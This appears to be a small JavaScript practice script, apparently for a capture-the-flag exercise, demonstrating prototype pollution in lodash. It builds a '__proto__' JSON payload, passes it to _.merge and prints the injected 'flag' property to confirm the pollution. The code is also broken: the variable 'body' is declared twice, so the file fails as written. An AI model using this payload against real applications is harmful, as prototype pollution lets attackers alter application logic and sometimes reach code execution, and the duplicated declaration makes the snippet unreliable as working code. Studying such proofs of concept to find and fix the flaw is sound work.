const _ = require('lodash')

let userid = 1
let title = 'aaaaa'
let body = 'dadawd\ndawdawdawd'
let date = new Date()
date = {
	year: date.getFullYear(),
	month: date.getMonth() + 1,
	day: date.getDate()
}
// let pathToModifyBody = 'body'

let body = {
	'userid': 1,

}

let info = {
	userid, 
	title, 
	body,
}

const payload = '{"__proto__":{"flag":"flag_dawdawndWDB"}}'
console.log(info, date)
_.merge(info, JSON.parse(payload))
console.log(info.flag)
console.log(info)
// _.set(info, pathToModifyBody, body)
// console.log(info)